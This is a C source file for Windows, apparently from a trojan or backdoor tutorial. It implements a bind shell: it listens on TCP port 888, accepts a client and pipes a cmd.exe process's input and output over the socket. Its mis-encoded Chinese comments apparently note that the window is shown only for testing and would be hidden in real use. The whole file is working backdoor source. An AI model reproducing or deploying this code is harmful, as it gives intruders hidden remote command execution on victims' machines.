#include <stdio.h>
#include <winsock2.h>
#pragma comment (lib, "ws2_32")

int main()
{
    WSADATA wsa;

    WSAStartup(MAKEWORD(2, 2), &wsa);

    // ����TCP�׽���
    SOCKET s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

    // ���׽���
    sockaddr_in sock;
    sock.sin_family = AF_INET;
    sock.sin_addr.S_un.S_addr = ADDR_ANY;
    sock.sin_port = htons(888);
    bind(s, (SOCKADDR*)&sock, sizeof(SOCKADDR));

    // ���׽���Ϊ����״̬
    listen(s, 1);

    // ���ܿͻ�������
    sockaddr_in sockClient;
    int SaddrSize = sizeof(SOCKADDR);
    SOCKET sc = accept(s, (SOCKADDR*)&sockClient, &SaddrSize);

    // �����ܵ�
    SECURITY_ATTRIBUTES sa1, sa2;
    HANDLE hRead1, hRead2, hWrite1, hWrite2;

    sa1.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa1.lpSecurityDescriptor = NULL;
    sa1.bInheritHandle = TRUE;

    sa2.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa2.lpSecurityDescriptor = NULL;
    sa2.bInheritHandle = TRUE;

    CreatePipe(&hRead1, &hWrite1, &sa1, 0);
    CreatePipe(&hRead2, &hWrite2, &sa2, 0);

    // ��������ͨ�ŵ��ӽ���
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    // Ϊ�˲�����������ΪSW_SHOW,��ʵ����Ӧ��ΪSW_HIDE
    si.wShowWindow = SW_SHOW;
    // �滻��׼����������
    // ��ľ���ų��򣬹ܵ�1���ڽ������
    // ���ں��ų��򣬹ܵ�2��������
    si.hStdInput = hRead2;
    si.hStdOutput = hWrite1;
    si.hStdError = hWrite1;

    char *szCmd = "cmd";

    CreateProcess(NULL, szCmd, NULL, NULL, 
                  TRUE, 0, NULL, NULL, &si, &pi);

    DWORD dwBytes = 0;
    BOOL bRet = FALSE;
    char szBuffer[0x1000] = { 0 };
    char szCommand[0x1000] = { 0 };

    while ( TRUE )
    {
        ZeroMemory(szCommand, 0x1000);

        bRet = PeekNamedPipe(hRead1, szBuffer, 0x1000, &dwBytes, 0, 0);
        if ( dwBytes )
        {
            // ��hStdOutput��hStdError��ܵ�1д�����ݺ�
            // Ӧ�ý��ܵ�1�е����ݶ���
            ReadFile(hRead1, szBuffer, 0x1000, &dwBytes, NULL);
            send(sc, szBuffer, dwBytes, 0);
        } 
        else
        {
            // �����̽��ܵ����ƶ˵����ݺ�
            // д�뵽�ܵ�2��
            int i = 0;
            while ( 1 )
            {
                dwBytes = recv(sc, szBuffer, 0x1000, 0);
                if ( dwBytes <= 0 )
                {
                    break;
                }
                
                szCommand[i++] = szBuffer[0];
                if ( szBuffer[0] == '\r' || szBuffer[0] == '\n' )
                {
                    szCommand[i-1] = '\n';
                    break;
                }
            }
            WriteFile(hWrite2, szCommand, i, &dwBytes, NULL);
        }
    }

    WSACleanup();

    return 0;
}